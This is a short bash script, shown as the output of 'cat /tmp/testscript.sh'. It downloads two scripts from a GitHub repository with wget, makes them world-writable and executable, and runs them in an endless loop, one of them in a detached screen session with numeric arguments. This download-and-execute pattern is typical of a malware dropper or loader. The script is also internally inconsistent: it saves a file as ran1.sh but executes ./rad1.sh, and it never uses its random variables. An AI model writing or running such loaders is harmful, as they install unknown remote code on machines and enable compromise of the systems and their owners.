# cat /tmp/testscript.sh
#!/bin/bash
ran1=$(openssl rand -hex 4)
ran2=$(openssl rand -hex 6)
wget https://github.com/Mafs68/hjs839/raw/main/rad1.sh -O ran1.sh 
wget https://github.com/Mafs68/hjs839/raw/main/Sec.sh -O ran2.sh

while :
do
	
	chmod 777 ran1.sh
	./rad1.sh
	sleep 5
	chmod 777 ran2.sh
	timeout 10m screen -dmS Sec.sh ./ran2.sh 65 75 
	sleep 5
done
